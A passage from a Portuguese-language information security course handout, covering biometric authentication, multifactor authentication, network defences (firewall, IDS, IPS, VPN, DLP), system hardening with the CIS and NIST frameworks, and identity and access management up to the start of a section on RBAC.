e segura de desbloquear dispositivos sem a necessidade de senhas. 
Exemplo Real: 
• 
Em 2017, a Apple introduziu o Face ID no iPhone, substituindo o Touch 
ID em alguns modelos. O Face ID usa sensores infravermelhos para 
mapear a geometria do rosto do usuário e permitir o desbloqueio do 
dispositivo. Desde então, a tecnologia se popularizou e é considerada 
uma das formas mais seguras de autenticação biométrica. 
Desvantagens da Biometria: 
• 
Privacidade: Há preocupações com a privacidade, pois, se os dados 
biométricos forem roubados ou comprometidos, não podem ser alterados 
(diferente de uma senha). 
• 
Falsos Positivos/Negativos: Sistemas biométricos podem ocasionalmente 
falhar, recusando acesso a um usuário legítimo (falso negativo) ou 
permitindo acesso a um invasor (falso positivo). 
• 
Dependência de Hardware: A autenticação biométrica requer hardware 
específico, como sensores de impressão digital ou câmeras de alta 
resolução. 
 
3. Autenticação Multifator (MFA): Uma Camada Adicional de Segurança 
A autenticação multifator (MFA) combina dois ou mais métodos de autenticação 
para fornecer uma camada adicional de segurança. O MFA é baseado no 
princípio de que, mesmo que um fator seja comprometido (por exemplo, uma 
senha), os outros fatores ainda protegerão o acesso. 
 
Fatores de Autenticação: 
1. Algo que você sabe (conhecimento): Como uma senha ou um PIN. 
2. Algo que você tem (posse): Como um token físico, um smartphone, ou um 
cartão de segurança. 
3. Algo que você é (biometria): Impressão digital, reconhecimento facial etc. 
Como Funciona: 
• 
O usuário primeiro insere sua senha (algo que ele sabe). 
• 
Depois, ele é solicitado a fornecer um segundo fator, como um código 
gerado em um aplicativo autenticador (algo que ele tem) ou uma 
verificação de impressão digital (algo que ele é). 
• 
Só então o acesso é concedido. Isso significa que, mesmo que um 
atacante descubra a senha, ele ainda precisaria do segundo fator (e 
possivelmente um terceiro) para acessar a conta. 
Exemplo de Autenticação Multifator: 
• 
Bancos Online: Muitos bancos usam MFA para proteger as contas de 
clientes. Depois de inserir a senha, o cliente recebe um código temporário 
em seu smartphone via SMS ou aplicativo autenticador, que precisa ser 
inserido para concluir o login. 
• 
Google e Autenticação de Dois Fatores (2FA): Ao ativar o 2FA no Google, 
além de inserir a senha, o usuário deve autenticar sua identidade com um 

 
 
código enviado via SMS ou gerado por um aplicativo como o Google 
Authenticator. 
Vantagens da Autenticação Multifator: 
• 
Maior Segurança: Mesmo que um fator (como uma senha) seja 
comprometido, o invasor não conseguirá acessar a conta sem o segundo 
fator. 
• 
Proteção contra ataques de Phishing: Mesmo que uma senha seja 
roubada por phishing, o invasor ainda precisaria do segundo fator para 
obter acesso. 
Exemplo Real: 
• 
Microsoft 2021: A Microsoft relatou que 99,9% dos ataques de contas 
Microsoft poderiam ser prevenidos com o uso da autenticação multifator. 
Isso ocorreu após inúmeros incidentes de roubo de credenciais sem MFA, 
em que hackers tiveram acesso a contas de usuários apenas com as 
senhas roubadas. 
Desvantagens do MFA: 
• 
Conveniência: O processo de login pode ser mais lento e inconveniente, 
especialmente se o segundo fator não estiver disponível (por exemplo, se 
o usuário perder o smartphone). 
• 
Custo Adicional: Implementar MFA em uma organização pode exigir 
hardware e software adicionais, o que pode aumentar os custos. 
 
Comparação das Técnicas de Autenticação 
 
Método 
Vantagens 
Desvantagens 
Senhas 
Simples de implementar 
e usar 
Vulnerável a ataques de 
phishing, bruteforce, password 
spraying e roubo de 
credenciais 
Biometria 
Conveniente e oferece 
segurança 
Depende de hardware 
especializado e pode 
apresentar problemas de 
privacidade 
MFA 
(autenticação 
multifator) 
Segurança elevada, 
mesmo que um fator 
seja comprometido 
Pode ser menos conveniente e 
adiciona custos + 
complexidade 
 
IMAGEM 2 – Tabela comparativa com prós e cons de diferentes tipos de 
técnicas de autenticação. 
 
A autenticação segura é uma peça vital da proteção digital no mundo atual. 
Senhas, biometria e autenticação multifator (MFA) são métodos amplamente 
utilizados, cada um com suas vantagens e desvantagens. Enquanto as senhas 
continuam sendo o método mais comum, elas estão se tornando cada vez mais 
vulneráveis a ataques. O uso de biometria e, especialmente, MFA oferece um 
nível muito mais elevado de segurança, e as organizações estão cada vez mais 
adotando essas técnicas para proteger suas redes, sistemas e dados contra 
ameaças crescentes. 
 
 

 
 
3.3. PRINCÍPIOS DE SEGURANÇA DE REDES: FIREWALLS, IDS, IPS, VPN 
E DLP 
A segurança de redes é um componente fundamental da proteção de dados e 
sistemas em qualquer infraestrutura de TI. Para garantir que uma rede esteja 
adequadamente protegida contra ameaças cibernéticas, é necessário 
implementar diversas tecnologias de segurança, cada uma atuando em 
diferentes camadas do modelo OSI (Open Systems Interconnection) e 
abordando aspectos específicos da segurança em camadas. 
A seguir, vamos discutir cinco tecnologias de segurança de redes essenciais: 
Firewalls, IDS (Intrusion Detection Systems), IPS (Intrusion Prevention 
Systems), VPN (Virtual Private Network) e DLP (Data Loss Prevention). 
Explicarei como cada uma dessas tecnologias funciona, em quais camadas do 
modelo OSI atuam, e como se integram para formar uma estratégia de 
segurança em camadas. 
1. Firewalls 
O Que é um Firewall? 
Um firewall é um dispositivo de segurança de rede que monitora e controla o 
tráfego de entrada e saída com base em regras de segurança predefinidas. Ele 
atua como uma barreira entre redes internas seguras (como a rede corporativa) 
e redes externas não confiáveis (como a Internet). O objetivo do firewall é permitir 
ou bloquear o tráfego de rede de acordo com as políticas de segurança 
configuradas. 
Usabilidade em Redes: 
• 
Controle de Tráfego: Firewalls são usados para controlar o fluxo de 
dados entre redes, permitindo o tráfego autorizado e bloqueando o não 
autorizado. Eles são frequentemente usados para proteger redes 
corporativas da Internet. 
• 
Aplicação de Políticas de Segurança: Firewalls podem ser configurados 
com regras personalizadas para bloquear determinados tipos de tráfego, 
como portas específicas ou protocolos inseguros. 
• 
Segurança Perimetral: Firewalls são frequentemente colocados na 
borda da rede para fornecer uma primeira linha de defesa contra ataques 
externos. 
Os firewalls tradicionais operam nas camadas 3 (Rede) e 4 (Transporte) do 
modelo OSI, filtrando pacotes de acordo com endereços IP e portas. Firewalls 
mais avançados (como firewalls de próxima geração) podem operar na camada 
7 (Aplicação), onde analisam o conteúdo das mensagens para detectar 
atividades maliciosas com base em aplicativos e serviços específicos. 
Exemplo de Usabilidade: 
Em uma empresa que usa um firewall de próxima geração (NGFW), o tráfego 
da Internet para a rede corporativa é monitorado e filtrado. Se um funcionário 

 
 
tentar acessar um site de alto risco ou fazer o download de um arquivo malicioso, 
o firewall bloqueará automaticamente o tráfego com base nas regras 
configuradas e nos recursos de inspeção profunda de pacotes (DPI). 
2. IDS (Intrusion Detection System) 
O Que é um IDS? 
Um Sistema de Detecção de Intrusão (IDS) monitora o tráfego de rede em 
busca de atividades suspeitas ou anômalas. O IDS não bloqueia o tráfego 
diretamente; em vez disso, ele alerta os administradores de rede sobre possíveis 
tentativas de invasão ou violações de segurança, para que possam ser 
investigadas e tratadas manualmente. 
Usabilidade em Redes: 
• 
Monitoramento de Rede: O IDS é implementado para monitorar o tráfego 
da rede em tempo real, detectando comportamentos incomuns ou tráfego 
que pode indicar um ataque. 
• 
Detecção de Ataques Conhecidos: Usando assinaturas de ataques 
(conjuntos de regras pré-configuradas), o IDS detecta padrões que 
correspondem a tentativas conhecidas de invasão. 
• 
Análise de Tráfego: IDSs podem ser usados para identificar 
vulnerabilidades no tráfego da rede, como tentativas de varredura de 
portas ou anomalias em pacotes de dados. 
O IDS opera principalmente nas camadas 3 (Rede) e 4 (Transporte) do modelo 
OSI, mas pode ser configurado para inspecionar dados nas camadas 5 
(Sessão) e 7 (Aplicação), dependendo do tipo de IDS (baseado em rede ou 
baseado em host). 
Exemplo de Usabilidade: 
Uma organização pode implementar um IDS para monitorar sua rede corporativa 
em busca de atividades como tentativas de port scanning ou ataques de DoS. 
Quando o IDS detecta uma tentativa de intrusão, ele gera um alerta, permitindo 
que a equipe de segurança responda antes que o ataque seja bem-sucedido. 
3. IPS (Intrusion Prevention System) 
O Que é um IPS? 
Um Sistema de Prevenção de Intrusão (IPS) é semelhante ao IDS, mas com 
uma funcionalidade adicional importante: ele não apenas detecta atividades 
suspeitas, mas também bloqueia automaticamente o tráfego malicioso em tempo 
real. O IPS age de maneira proativa para prevenir ataques e proteger a rede 
contra invasões. 
Usabilidade em Redes: 

 
 
• 
Bloqueio Automático: O IPS pode bloquear pacotes de dados 
maliciosos ou tráfego suspeito assim que é detectado, sem a necessidade 
de intervenção humana. 
• 
Prevenção de Ataques: Um IPS pode proteger contra ataques 
conhecidos e desconhecidos, identificando padrões anômalos e 
respondendo imediatamente. 
• 
Integração com Firewalls: Muitas vezes, o IPS é integrado ao firewall, 
formando uma barreira de defesa mais robusta que monitora e impede 
ataques de rede em tempo real. 
Assim como o IDS, o IPS também opera nas camadas 3 (Rede), 4 (Transporte) 
e, em sistemas avançados, nas camadas 5 (Sessão) e 7 (Aplicação), onde 
pode realizar inspeção de pacotes para detectar comportamentos suspeitos. 
Exemplo de Usabilidade: 
Em uma rede corporativa, um IPS pode ser configurado para monitorar o tráfego 
de entrada e bloquear automaticamente um ataque SQL Injection que tenta 
explorar vulnerabilidades em um banco de dados de uma aplicação web. Assim, 
o IPS impede que o ataque comprometa dados sensíveis. 
4. VPN (Virtual Private Network) 
O Que é uma VPN? 
Uma Rede Virtual Privada (VPN) cria um túnel criptografado entre dois pontos 
na rede, permitindo que dados trafeguem de forma segura mesmo em redes 
públicas, como a Internet. Uma VPN protege a confidencialidade dos dados, 
garantindo que eles não sejam interceptados ou lidos por terceiros. 
Usabilidade em Redes: 
• 
Acesso Remoto Seguro: Uma VPN permite que funcionários ou usuários 
remotos se conectem à rede corporativa de maneira segura, como se 
estivessem fisicamente presentes no local. 
• 
Conexão Segura em Redes Públicas: Usuários podem usar a VPN para 
proteger seus dados ao se conectar à Internet em redes públicas, como 
Wi-Fi de cafés ou aeroportos. 
• 
Comunicação Segura entre Filiais: VPNs são amplamente utilizadas 
para interconectar filiais ou escritórios remotos, garantindo que a 
comunicação entre eles seja segura e privada. 
As VPNs operam principalmente nas camadas 3 (Rede) e 4 (Transporte) do 
modelo OSI, pois lidam com a criação de túneis entre redes IP e a criptografia 
do tráfego de dados. Algumas soluções de VPN também podem operar na 
camada 7 (Aplicação), onde a criptografia ocorre em protocolos específicos, 
como HTTP (HTTPS). 
Exemplo de Usabilidade: 

 
 
Uma empresa que permite home office para seus funcionários pode 
implementar uma VPN para que eles se conectem à rede corporativa 
remotamente. Isso garante que todas as comunicações entre o funcionário e a 
empresa sejam criptografadas, protegendo dados sensíveis de ataques de 
interceptação. 
5. DLP (Data Loss Prevention) 
O Que é DLP? 
A Prevenção de Perda de Dados (DLP) é uma tecnologia que detecta e previne 
a transferência de dados sensíveis ou confidenciais para fora da rede de uma 
organização sem autorização. O objetivo do DLP é proteger dados críticos, como 
informações pessoais, financeiras e de propriedade intelectual, contra 
vazamentos acidentais ou maliciosos. 
Usabilidade em Redes: 
• 
Monitoramento de Dados Sensíveis: O DLP monitora o tráfego de rede 
em busca de tentativas de enviar informações confidenciais, como 
números de cartão de crédito, fora da rede. 
• 
Bloqueio de Transferências Não Autorizadas: Quando uma violação 
de política é detectada (por exemplo, um funcionário tentando enviar 
documentos sigilosos por e-mail pessoal), o DLP pode bloquear a 
transferência e alertar os administradores. 
• 
Proteção de Dados em Movimento e em Repouso: O DLP pode 
proteger dados armazenados (em repouso) ou em trânsito (enquanto são 
transferidos pela rede). 
O DLP atua principalmente nas camadas 5 (Sessão) e 7 (Aplicação), pois 
analisa o conteúdo dos pacotes de dados em movimento, como e-mails ou 
uploads para a nuvem, e toma decisões com base nas políticas de segurança 
configuradas. 
Exemplo de Usabilidade: 
Uma empresa que lida com informações de saúde sensíveis pode configurar um 
sistema de DLP para impedir que funcionários enviem por e-mail arquivos 
contendo informações de pacientes. O DLP monitora e bloqueia qualquer 
tentativa de transferência de arquivos não autorizados, evitando violações de 
privacidade e conformidade com regulamentos como a LGPD. 
Segurança em Camadas e o Modelo OSI 
A estratégia de segurança em camadas (Defense in Depth) é o conceito de 
implementar várias medidas de segurança em diferentes níveis da rede e em 
diferentes camadas do modelo OSI. O objetivo é que, se uma camada de 
segurança for comprometida, outras ainda estejam em vigor para proteger o 
sistema. 
Exemplo de Segurança em Camadas com as Tecnologias: 

 
 
1. Firewall: Na borda da rede (Camadas 3 e 4), controla o tráfego de entrada 
e saída com base em regras predefinidas. 
2. VPN: Nas camadas 3 e 4, cria um túnel criptografado para proteger a 
confidencialidade das comunicações. 
3. IPS: Monitora o tráfego nas camadas 3, 4 e 7 e bloqueia automaticamente 
tentativas de ataque. 
4. DLP: Nas camadas 5 e 7, previne a exfiltração de dados confidenciais por 
canais não autorizados. 
5. IDS: Atua na detecção de atividades anômalas e alerta administradores 
sobre possíveis intrusões. 
As tecnologias como Firewalls, IDS, IPS, VPN e DLP são peças fundamentais 
de uma estratégia de segurança em camadas. Cada uma atua em diferentes 
pontos do modelo OSI e complementa as outras para fornecer uma defesa 
robusta contra uma ampla gama de ameaças. Implementar essas tecnologias 
em conjunto ajuda a proteger redes contra-ataques, intrusões, vazamentos de 
dados e outras ameaças cibernéticas, criando um ambiente seguro e resiliente. 
3.4. INTRODUÇÃO AO HARDENING E SUA IMPORTÂNCIA NA 
SEGURANÇA 
 
Hardening é o processo de fortalecer a segurança de sistemas, redes e 
dispositivos, minimizando as superfícies de ataque e reduzindo as 
vulnerabilidades. Isso é feito por meio da configuração de sistemas de forma a 
limitar 
possíveis 
vetores 
de 
ataques, 
desabilitando 
funcionalidades 
desnecessárias, aplicando patches de segurança, implementando controles 
adequados e restringindo o acesso apenas ao que é necessário para o 
funcionamento do sistema. 
O hardening não se limita a sistemas operacionais, mas se aplica também a 
bancos de dados, aplicativos, dispositivos de rede e até sistemas integrados. O 
objetivo principal é garantir que cada componente de uma infraestrutura de TI 
esteja protegido de ameaças, reduzindo o risco de exploração por 
cibercriminosos. 
 
A Importância do Hardening na Segurança 
No contexto atual de segurança cibernética, as organizações enfrentam uma 
ampla variedade de ameaças, desde ataques de malware e ransomware até 
tentativas de intrusão e exfiltração de dados. Muitas dessas ameaças exploram 
vulnerabilidades em configurações padrão de sistemas, que podem ser deixadas 
expostas por negligência ou desconhecimento. O processo de hardening é uma 
medida preventiva crítica para garantir que essas vulnerabilidades sejam 
mitigadas, proporcionando uma defesa robusta contra ataques. 
 
A seguir, veremos os principais benefícios do hardening na segurança: 
• 
Redução da Superfície de Ataque: A remoção de serviços e 
funcionalidades desnecessárias reduz as oportunidades para que 
atacantes explorem vulnerabilidades. 
• 
Mitigação de Vulnerabilidades Conhecidas: Aplicar patches de 
segurança e configurar adequadamente os sistemas reduz o risco de 
exploração de falhas conhecidas. 

 
 
• 
Conformidade com Normas e Regulamentos: O hardening ajuda as 
organizações a aderirem a normas de segurança e frameworks, como o 
NIST e o CIS Controls, que fornecem diretrizes para práticas de 
hardening. 
• 
Defesa em Profundidade: O hardening é uma parte crítica de uma 
estratégia de segurança em camadas (Defense in Depth), onde 
diferentes camadas de segurança protegem os ativos de uma 
organização. 
 
Correlacionando o Hardening com Frameworks de Segurança 
 
Dois frameworks amplamente reconhecidos que tratam do hardening e da 
segurança de sistemas são o CIS Controls (Center for Internet Security 
Controls) e o NIST Cybersecurity Framework. Ambos oferecem orientações 
claras sobre a importância do hardening e como implementá-lo em diversas 
infraestruturas. 
 
1. CIS Controls 
Os CIS Controls são um conjunto de práticas recomendadas para melhorar a 
postura de segurança de uma organização. Eles incluem controles específicos 
que abordam o processo de hardening de sistemas e são amplamente usados 
como guia para reduzir as vulnerabilidades. 
Controles Relacionados ao Hardening: 
• 
CIS Control 5: Secure Configuration for Hardware and Software on 
Mobile Devices, Laptops, Workstations and Servers 
o Esse controle destaca a importância de configurar adequadamente 
todos os sistemas (hardware e software) e garantir que eles 
estejam alinhados com as melhores práticas de segurança. O 
objetivo é garantir que sistemas críticos não estejam operando com 
configurações padrão, que geralmente são mais vulneráveis. 
• 
CIS Control 6: Maintenance, Monitoring, and Analysis of Audit Logs 
o A manutenção e análise regular de logs de auditoria ajuda a 
identificar atividades suspeitas ou configurações incorretas, que 
podem indicar vulnerabilidades que necessitam de hardening. 
Exemplo Prático: 
• 
Após implementar um servidor web, a organização remove todos os 
módulos e serviços desnecessários, garantindo que apenas os 
componentes essenciais estejam ativos. Isso segue a recomendação do 
CIS Control 5, garantindo que o servidor não seja vulnerável a ataques 
através de funcionalidades que não são utilizadas. 
 
2. NIST Cybersecurity Framework 
O NIST Cybersecurity Framework é amplamente utilizado para gerenciar e 
reduzir riscos de segurança cibernética. Ele é estruturado em torno de cinco 
funções principais: Identificar, Proteger, Detectar, Responder e Recuperar. O 
hardening está fortemente relacionado à função Proteger, já que o objetivo é 
implementar controles de proteção para reduzir a possibilidade de exploração de 
vulnerabilidades. 
 
Funções Relacionadas ao Hardening: 

 
 
• 
PR.IP-1: 
A 
baseline 
configuration 
of 
information 
technology/industrial control systems is created and maintained 
o Este subcontrole enfatiza a importância de manter uma 
configuração de segurança básica para todos os sistemas. Isso 
inclui o hardening de sistemas operacionais, software e hardware. 
• 
PR.IP-3: Configuration change control processes are in place 
o Este controle foca na manutenção e no monitoramento contínuo de 
mudanças nas configurações. O processo de hardening é 
dinâmico, o que significa que as configurações precisam ser 
constantemente revisadas e ajustadas conforme surgem novas 
ameaças. 
Exemplo Prático: 
• 
Uma organização que segue o NIST Framework implementa hardening 
em seus servidores, criando configurações base que são revisadas e 
atualizadas regularmente para garantir que novos patches de segurança 
sejam aplicados e que as práticas de hardening sejam mantidas ao longo 
do tempo. 
 
Principais Práticas de Hardening 
Para entender o processo de hardening, aqui estão algumas práticas 
recomendadas que se aplicam a diferentes sistemas: 
1. Remoção de Serviços e Software Desnecessários 
• 
Descrição: Serviços e aplicativos desnecessários aumentam a superfície 
de ataque, pois podem conter vulnerabilidades não exploradas. 
• 
Exemplo: Em um servidor web, desativar serviços como o FTP ou Telnet 
que não são usados pela organização reduz as possíveis portas de 
entrada para ataques. 
2. Aplicação de Patches e Atualizações 
• 
Descrição: Manter sistemas e softwares atualizados com os patches de 
segurança mais recentes é uma das práticas mais básicas e essenciais 
no hardening. 
• 
Exemplo: Aplicar um patch de segurança em um sistema Windows que 
corrige uma vulnerabilidade de dia-zero evita que hackers aproveitem 
essa falha para comprometer o sistema. 
3. Configurações Seguras de Senhas 
• 
Descrição: Assegurar que as políticas de senha sigam as melhores 
práticas de segurança (complexidade, expiração regular etc.) é 
fundamental para o hardening. 
• 
Exemplo: Implementar uma política que exige senhas fortes com pelo 
menos 12 caracteres, incluindo letras, números e símbolos, impede que 
senhas fracas sejam usadas para comprometer sistemas. 
4. Restrição de Privilégios 
• 
Descrição: Seguir o princípio do menor privilégio, ou seja, garantir que 
os usuários e sistemas tenham apenas as permissões necessárias para 
executar suas funções, ajuda a limitar o impacto de uma possível 
exploração. 
• 
Exemplo: Conceder acesso de administrador apenas a um pequeno 
número de usuários e garantir que eles utilizem contas padrão para 
tarefas diárias reduz o risco de comprometer um sistema. 
5. Configuração de Logs e Monitoramento de Eventos 

 
 
• 
Descrição: Configurar os logs de auditoria para registrar eventos 
importantes (como tentativas de login falhadas ou mudanças em arquivos 
de configuração) ajuda a identificar e responder a incidentes de 
segurança. 
• 
Exemplo: Implementar a retenção de logs de 30 dias em um servidor 
crítico e revisar regularmente esses logs para garantir que tentativas de 
ataque sejam detectadas rapidamente. 
 
O hardening é uma prática fundamental na proteção de sistemas contra 
ameaças cibernéticas. Ao eliminar vulnerabilidades e configurar sistemas para 
minimizar as superfícies de ataque, o hardening reduz significativamente o risco 
de exploração. Frameworks como o CIS Controls e o NIST Cybersecurity 
Framework fornecem diretrizes claras sobre como implementar o hardening de 
forma eficiente e integrada às estratégias de segurança cibernética da 
organização. 
A implementação contínua e consistente de práticas de hardening, como a 
remoção de serviços desnecessários, a aplicação de patches e o monitoramento 
regular de sistemas, cria uma defesa robusta contra ataques cibernéticos, 
garantindo que os sistemas estejam sempre protegidos e prontos para enfrentar 
ameaças emergentes. 
 
 
 
 
 
 

 
 
UNIDADE 4 GESTÃO DE ACESSOS E IDENTIDADES 
 
Nesta unidade, vamos aprender sobre gestão de identidades e conceitos 
fundamentais presentes nesta temática como por exemplo PAM. Vamos 
entender também como funciona controle de acesso baseado em papéis e 
atributos, como RBAC e ABAC. Além disso, vamos entender como monitorar e 
auditar esses contextos relacionados a controle de acessos. 
 
OBJETIVOS DA UNIDADE 4 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Compreender o que é PAM; 
 
• Diferenças entre RBAC e ABAC; 
 
• Entender minimamente como funciona um monitoramento e auditoria de 
controle/gestão de acessos. 
 
 
 

 
 
4.1. CONCEITOS DE IAM (IDENTITY AND ACCESS MANAGEMENT) 
 
IAM (Identity and Access Management), ou Gestão de Identidade e Acesso, é 
um conjunto de políticas, processos e tecnologias que garantem que as pessoas 
corretas, ou entidades, tenham o nível apropriado de acesso aos recursos 
corretos no momento certo. O IAM é fundamental para a segurança de qualquer 
organização, pois controla quem tem acesso a sistemas, aplicativos e dados, e 
define o que esses usuários podem fazer. 
Vamos entender os principais conceitos, funções e a importância do IAM de 
maneira didática, aplicável a uma disciplina de segurança da informação. 
 
1. O Que é IAM? 
O IAM é o controle centralizado de identidades (quem é o usuário) e seus 
acessos (o que o usuário pode fazer) dentro de um ambiente de TI. Ele abrange: 
• 
Identidades digitais: Representação dos usuários (pessoas, sistemas ou 
dispositivos) que acessam os recursos. 
• 
Acessos: Concessão de direitos ou permissões a esses usuários para 
acessar sistemas, dados ou recursos, de acordo com suas necessidades 
e funções. 
Em termos simples, o IAM garante que as pessoas certas tenham o acesso certo 
aos sistemas certos. 
 
Exemplo Prático: 
Imagine um banco com centenas de funcionários. Cada funcionário deve 
acessar apenas as informações necessárias para seu trabalho. Um funcionário 
do setor de RH precisa acessar informações pessoais de funcionários, mas não 
deve ter acesso a dados financeiros dos clientes. Já um analista financeiro deve 
acessar os dados de clientes, mas não precisa ver informações pessoais dos 
funcionários. O IAM controla essas permissões de acesso de acordo com as 
necessidades de cada usuário. 
 
2. Componentes Principais de IAM 
Existem vários componentes-chave que formam a base do IAM. Vamos entender 
os principais: 
2.1. Identidade 
• 
A identidade é a representação digital de um usuário ou entidade (como 
um sistema ou dispositivo) dentro de uma rede. Isso pode incluir dados 
pessoais, como nome, cargo, número de funcionário, ou até mesmo uma 
identidade digital única. 
• 
Cada identidade é única e corresponde a um usuário específico. 
Exemplo Prático: Quando um funcionário é contratado por uma empresa, ele 
recebe uma identidade no sistema, que pode incluir um nome de usuário (como 
joao.silva@empresa.com) e uma senha para autenticação. 
2.2. Autenticação 
• 
Autenticação é o processo pelo qual o usuário prova sua identidade para 
o sistema. Isso geralmente é feito com uma senha, mas pode envolver 
métodos mais avançados, como autenticação multifator (MFA), que 
pode incluir senhas, tokens ou biometria. 
Exemplo Prático: Quando João tenta acessar seu e-mail corporativo, ele deve 
inserir seu nome de usuário e senha. Se o sistema usa autenticação multifator, 
ele também pode precisar inserir um código enviado para seu smartphone. 

 
 
2.3. Autorização 
• 
Autorização é o processo que ocorre depois da autenticação, onde o 
sistema decide o que o usuário pode acessar ou fazer com base nas suas 
permissões ou privilégios. A autorização garante que cada usuário só 
possa realizar as ações necessárias para seu trabalho. 
Exemplo Prático: Depois de autenticar, João consegue acessar apenas seus 
e-mails, não o sistema financeiro da empresa, pois ele não tem autorização para 
isso. 
2.4. Controle de Acesso 
• 
Controle de Acesso refere-se às políticas e regras que definem quem 
pode acessar quais recursos dentro do sistema. Existem várias maneiras 
de implementar controle de acesso: 
o Controle de Acesso Baseado em Função (RBAC): Concede 
permissões com base no cargo ou função do usuário (ex.: Gerente 
de RH, Analista Financeiro). 
o Controle 
de 
Acesso 
Baseado 
em 
Atributos 
(ABAC): 
Permissões são concedidas com base em atributos específicos do 
usuário (ex.: localidade, tipo de dispositivo). 
Exemplo Prático: Em uma empresa que usa RBAC, todos os membros da 
equipe de vendas têm as mesmas permissões para acessar o sistema de CRM, 
mas não podem acessar os sistemas de contabilidade. 
 
3. A Importância do IAM 
O IAM é vital para a segurança da informação por vários motivos: 
3.1. Proteção contra Acessos Indevidos 
• 
Com o IAM, as organizações garantem que apenas usuários autorizados 
tenham acesso a sistemas e dados críticos. Sem IAM, há risco de acessos 
não autorizados, que podem comprometer informações sensíveis. 
Exemplo Prático: Um hacker que obtém a senha de um funcionário de baixo 
nível sem IAM poderia potencialmente acessar sistemas críticos se não 
houvesse controle de acesso adequado. 
3.2. Minimização de Riscos Internos 
• 
Muitas violações de segurança são causadas por funcionários ou usuários 
internos. O IAM ajuda a limitar esses riscos, garantindo que cada pessoa 
tenha apenas o acesso necessário para realizar suas funções (princípio 
do menor privilégio). 
Exemplo Prático: Um funcionário da área de TI pode ter permissões para 
acessar servidores, mas não deve ter acesso a dados financeiros, minimizando 
o risco de abuso de acesso. 
3.3. Conformidade com Regulamentações 
• 
O IAM é essencial para cumprir regulamentações de proteção de dados, 
como a LGPD (Lei Geral de Proteção de Dados) no Brasil e o GDPR na 
Europa. Essas leis exigem que as organizações protejam adequadamente 
os dados pessoais e garantam que apenas as pessoas autorizadas 
possam acessá-los. 
Exemplo Prático: Um hospital que lida com dados sensíveis de pacientes deve 
garantir que apenas os profissionais médicos autorizados possam acessar 
prontuários. Isso é necessário para estar em conformidade com a LGPD. 
 
4. Tecnologias Associadas ao IAM 

 
 
Existem várias tecnologias e ferramentas que suportam o gerenciamento de 
identidades e acessos. Algumas das mais comuns incluem: 
4.1. Single Sign-On (SSO) 
• 
O Single Sign-On (SSO) permite que os usuários se autentiquem uma 
única vez e acessem vários sistemas ou aplicativos sem precisar inserir 
credenciais adicionais para cada um. Isso melhora a experiência do 
usuário e simplifica o gerenciamento de credenciais. 
Exemplo Prático: Quando João faz login em seu portal de RH, ele 
automaticamente tem acesso a outros sistemas internos, como o CRM e o 
sistema de folha de pagamento, sem precisar fazer login novamente. 
4.2. Autenticação Multifator (MFA) 
• 
A Autenticação Multifator (MFA) adiciona uma camada extra de 
segurança exigindo que os usuários forneçam mais de uma prova de 
identidade. Isso pode incluir uma senha, um código enviado para o 
telefone, uma impressão digital etc. 
Exemplo Prático: Um banco que usa MFA pode exigir que um cliente insira sua 
senha e, em seguida, forneça um código enviado por SMS para realizar uma 
transação. 
4.3. Provisionamento de Usuários 
• 
O Provisionamento de Usuários automatiza a criação, modificação e 
exclusão de contas de usuários com base em suas funções e status. Isso 
garante que novos funcionários recebam acesso rapidamente e que o 
acesso de funcionários que saem da empresa seja removido 
imediatamente. 
Exemplo Prático: Quando João é promovido de analista para gerente, o sistema 
de provisionamento ajusta automaticamente suas permissões, concedendo 
acesso a sistemas de gestão de equipe e removendo acessos desnecessários. 
 
5. IAM e Segurança em Camadas 
O IAM é uma peça-chave em uma abordagem de segurança em camadas. Ele 
se concentra na gestão da identidade e no controle de acesso, o que garante 
que apenas as pessoas certas possam interagir com os sistemas críticos, 
integrando-se com outras tecnologias de segurança, como firewalls e IDS/IPS. 
 
O IAM (Identity and Access Management) é essencial para proteger o ambiente 
de TI de uma organização. Ele permite que as organizações gerenciem de 
maneira eficaz quem tem acesso a quais sistemas e dados, garantindo que esse 
acesso seja apropriado e seguro. Através de autenticação, autorização e 
controle de acesso, o IAM fortalece a segurança cibernética, minimiza riscos 
internos e garante conformidade com regulamentações de proteção de dados. 
Ao entender e implementar o IAM de maneira adequada, as empresas podem 
proteger suas redes e ativos críticos, fornecendo a base para uma gestão de 
segurança robusta e eficiente. 
 
 
4.2. CONTROLE DE ACESSO BASEADO EM PAPÉIS (RBAC) E ATRIBUTOS 
(ABAC) 
 
O controle de acesso é uma parte crucial da segurança da informação, pois 
determina quem pode acessar determinados recursos e quais ações podem ser 
realizadas. Existem várias formas de controle de acesso, e duas das mais 

 
 
comuns são o Controle de Acesso Baseado em Papéis (RBAC) e o Controle 
de Acesso Baseado em Atributos (ABAC). Cada um desses modelos tem suas 
próprias características e aplicações, e entender suas diferenças é essencial 
para garantir a segurança e eficiência no gerenciamento de permissões dentro 
de uma organização. 
 
1. Controle de Acesso Baseado em Papéis (RBAC) 
O RBAC (Role-Based Access Control), ou Controle de Acesso Baseado em 
Papéis, é um modelo no qual as permissões de acesso são atribuídas com base 
nos papéis que os usuários têm dentro da organização. Ou seja, em vez de 
definir permissões individualmente para cada usuário, as permissões são 
associadas a papéis, e os usuários recebem esses papéis de acordo com suas 
funções ou responsabilidades. 
Como Funciona: 
• 
Papéis: São definidos com base nas funções dentro da organização, 
como “Administrador”, “Gerente”, “Funcionário”, “Analista de TI”, entre 
outros. 
• 
Permissões Associadas aos Papéis: Cada papel tem um conjunto 
específico de permissões que determinam o que os usuários podem fazer. 
Isso pode incluir ações como ler, escrever, editar ou deletar informações 
em um sistema. 
• 
Usuários Associados aos Papéis: Cada usuário é atribuído a um ou 
mais papéis, o que automaticamente lhes concede as permissões 
associadas a esses papéis. 
Exemplo Prático: 
Imagine uma organização com três tipos de usuários: Gerentes, Funcionários e 
Estagiários. No modelo RBAC: 
• 
Gerentes: Têm permissões para aprovar transações, editar dados de 
funcionários e gerar relatórios. 
• 
Funcionários: Podem acessar o sistema para inserir dados e visualizar 
relatórios, mas não podem editá-los ou aprová-los. 
• 
Estagiários: Podem apenas visualizar os dados. 
Com o RBAC, se uma pessoa for promovida de funcionário a gerente, basta 
atribuir a ela o papel de “Gerente” para que as permissões sejam 
automaticamente ajustadas, sem a necessidade de configurar permissões 
manualmente. 
Vantagens do RBAC: 
• 
Facilidade de Gerenciamento: As permissões são definidas com base 
em papéis comuns, o que torna a gestão de acessos mais simples e 
organizada. 
• 
Escalabilidade: O RBAC é eficiente em grandes organizações, pois não 
exige que as permissões sejam configuradas individualmente para cada 
usuário. 
• 
Segurança e Consistência: Garante que os usuários tenham acesso 
somente ao que é necessário para suas funções, reduzindo a 
